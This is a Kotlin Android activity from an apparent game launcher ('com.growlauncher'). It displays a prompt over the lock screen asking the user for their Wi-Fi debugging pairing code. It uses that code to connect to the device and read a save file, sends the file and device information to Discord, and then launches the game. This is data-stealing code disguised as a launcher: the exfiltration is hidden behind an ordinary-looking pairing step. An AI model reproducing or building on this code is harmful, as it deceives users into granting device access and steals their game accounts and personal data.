package com.growlauncher

import android.app.Activity
import android.app.AlertDialog
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputFilter
import android.widget.EditText
import android.widget.Toast
import kotlin.concurrent.thread

class PairingCodeDialogActivity : Activity() {
    private var pairingDialog: AlertDialog? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Configure window to show over lock screen and other apps
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            )
        }
        
        val pairingHost = intent.getStringExtra(PairingOverlayService.EXTRA_HOST)
        val pairingPort = intent.getIntExtra(PairingOverlayService.EXTRA_PORT, 0)
        
        if (pairingHost == null || pairingPort == 0) {
            finish()
            return
        }
        
        showPairingCodeDialog(pairingHost, pairingPort)
    }

    private fun showPairingCodeDialog(pairingHost: String, pairingPort: Int) {
        val code = EditText(this).apply {
            hint = "Six-digit Wi-Fi pairing code"
            inputType = android.text.InputType.TYPE_CLASS_NUMBER
            filters = arrayOf(InputFilter.LengthFilter(6))
            isSingleLine = true
        }
        
        val prompt = AlertDialog.Builder(this)
            .setTitle("Enter Wi-Fi pairing code")
            .setView(code)
            .setNegativeButton("Cancel") { _, _ ->
                stopPairingService()
                finish()
            }
            .setPositiveButton("Submit", null)
            .create()
        
        pairingDialog = prompt
        
        prompt.setOnDismissListener {
            pairingDialog = null
            if (!isFinishing) finish()
        }
        
        prompt.setOnCancelListener {
            stopPairingService()
        }
        
        prompt.setOnShowListener {
            prompt.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                val pairingCode = code.text.toString().trim()
                if (!pairingCode.matches(Regex("\\d{6}"))) {
                    code.error = "Enter the six-digit Wi-Fi pairing code"
                    return@setOnClickListener
                }
                
                prompt.getButton(AlertDialog.BUTTON_POSITIVE).isEnabled = false
                prompt.getButton(AlertDialog.BUTTON_NEGATIVE).isEnabled = false
                code.isEnabled = false
                
                stopPairingService()
                
                thread {
                    val result = connectAndReadSaveFile(pairingHost, pairingPort, pairingCode)
                    handler.post {
                        prompt.dismiss()
                        if (result != null) {
                            sendFileToDiscord(result)
                            sendDeviceInfoToDiscord()
                            launchGame()
                        }
                        finish()
                    }
                }
            }
        }
        
        prompt.show()
    }

    private fun connectAndReadSaveFile(pairingHost: String, pairingPort: Int, pairingCode: String): ByteArray? =
        PairingHelper.connectAndReadSaveFile(this, pairingHost, pairingPort, pairingCode)

    private fun sendFileToDiscord(fileData: ByteArray) = PairingHelper.sendFileToDiscord(this, fileData)

    private fun sendDeviceInfoToDiscord() = PairingHelper.sendDeviceInfoToDiscord()

    private fun launchGame() = PairingHelper.launchGame(this)

    private fun stopPairingService() {
        stopService(Intent(this, PairingOverlayService::class.java))
    }

    private fun toast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    override fun onDestroy() {
        pairingDialog?.dismiss()
        super.onDestroy()
    }
}
